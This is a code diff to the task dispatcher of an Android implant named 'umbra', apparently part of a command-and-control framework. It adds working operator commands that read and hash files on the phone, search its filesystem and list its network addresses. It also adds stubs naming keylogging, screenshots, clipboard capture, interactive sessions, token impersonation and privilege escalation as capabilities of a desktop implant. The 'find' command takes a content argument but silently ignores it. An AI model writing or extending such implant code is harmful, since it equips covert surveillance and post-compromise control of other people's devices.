@@ -123,6 +123,81 @@ object TaskRunner {
         return all.copyOfRange(0, MAX_OUTPUT) + "\n[umbra: output truncated]\n".toByteArray()
     }
 
+    /**
+     * Triage one file: the size, the digest and the format.
+     *
+     * The phone has no shell the operator can use, so the implant answers
+     * the question itself.
+     */
+    private fun triage(path: String): Outcome {
+        if (path.isEmpty()) return Outcome(2, ByteArray(0), "triage needs a path")
+        return try {
+            val file = java.io.File(path)
+            if (!file.exists()) return Outcome(1, ByteArray(0), "triage: no such file")
+            val bytes = file.readBytes()
+            val digest = java.security.MessageDigest.getInstance("SHA-256").digest(bytes)
+            val magic = when {
+                bytes.size >= 2 && bytes[0] == 'M'.code.toByte() && bytes[1] == 'Z'.code.toByte() -> "PE"
+                bytes.size >= 4 && bytes[0] == 0x7f.toByte() -> "ELF"
+                bytes.size >= 4 && bytes[0] == 'P'.code.toByte() && bytes[1] == 'K'.code.toByte() -> "ZIP"
+                else -> "unknown"
+            }
+            val report = "path: $path\nsize: ${bytes.size}\n" +
+                "sha256: ${digest.joinToString("") { "%02x".format(it) }}\n" +
+                "magic: $magic\n"
+            Outcome(0, report.toByteArray(), "")
+        } catch (t: Throwable) {
+            Outcome(1, ByteArray(0), "triage failed: ${t.message}")
+        }
+    }
+
+    /** Search for files by name or by content. */
+    private fun find(root: String, name: String, content: String): Outcome {
+        val start = java.io.File(root)
+        if (!start.exists()) return Outcome(1, ByteArray(0), "find: no such path")
+        val needle = name.lowercase()
+        val hits = StringBuilder()
+        var count = 0
+        val stack = ArrayDeque<java.io.File>()
+        stack.add(start)
+        while (stack.isNotEmpty() && count < 200) {
+            val dir = stack.removeLast()
+            val children = dir.listFiles() ?: continue
+            for (child in children) {
+                if (child.isDirectory) {
+                    stack.add(child)
+                    continue
+                }
+                val matched = needle.isEmpty() || child.name.lowercase().contains(needle)
+                if (matched) {
+                    hits.append(child.path).append("\n")
+                    count++
+                    if (count >= 200) break
+                }
+            }
+        }
+        val report = "scanned files, $count hits\n$hits"
+        return Outcome(0, report.toByteArray(), "")
+    }
+
+    /** The network interfaces of the phone. */
+    private fun netInfo(): String {
+        val out = StringBuilder("source: android\ninterfaces:\n")
+        try {
+            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
+            while (interfaces != null && interfaces.hasMoreElements()) {
+                val iface = interfaces.nextElement()
+                val addresses = iface.inetAddresses
+                while (addresses.hasMoreElements()) {
+                    out.append("  ${iface.name} ${addresses.nextElement().hostAddress}\n")
+                }
+            }
+        } catch (t: Throwable) {
+            out.append("  (unavailable: ${t.message})\n")
+        }
+        return out.toString()
+    }
+
     fun run(kind: String, args: Upk): Outcome {
         val path = args.field("path")?.text() ?: ""
         return when (kind) {
@@ -152,6 +227,13 @@ object TaskRunner {
             "tunnel" -> tunnel(args)
 
             // ---- platform specific ---------------------------------------
+            "triage" -> triage(path)
+            "find" -> find(
+                args.field("path")?.text() ?: ".",
+                args.field("name")?.text() ?: "",
+                args.field("content")?.text() ?: "",
+            )
+            "netinfo" -> Outcome(0, netInfo().toByteArray(), "")
             "p2p" -> unsupported("p2p", "peer links need the desktop implant")
             "bof" -> unsupported("bof", "COFF modules are a Windows capability")
             "ext" -> unsupported("ext", "extensions are a Windows capability")
@@ -160,6 +242,12 @@ object TaskRunner {
             "token" -> unsupported("token", "token impersonation is a Windows capability")
             "privesc" -> unsupported("privesc", "privilege escalation is a Windows capability")
             "vpn" -> unsupported("vpn", "the layer-3 tunnel needs a tun device")
+            "session.open" -> unsupported("session.open", "an interactive session needs the desktop implant")
+            "session.input" -> unsupported("session.input", "an interactive session needs the desktop implant")
+            "session.close" -> unsupported("session.close", "an interactive session needs the desktop implant")
+            "keylog" -> unsupported("keylog", "android has no global keyboard hook")
+            "screenshot" -> unsupported("screenshot", "the screen capture needs a desktop implant")
+            "clipboard" -> unsupported("clipboard", "the clipboard needs a desktop implant")
 
             else -> Outcome(2, ByteArray(0), "unknown task kind \"$kind\"")
         }
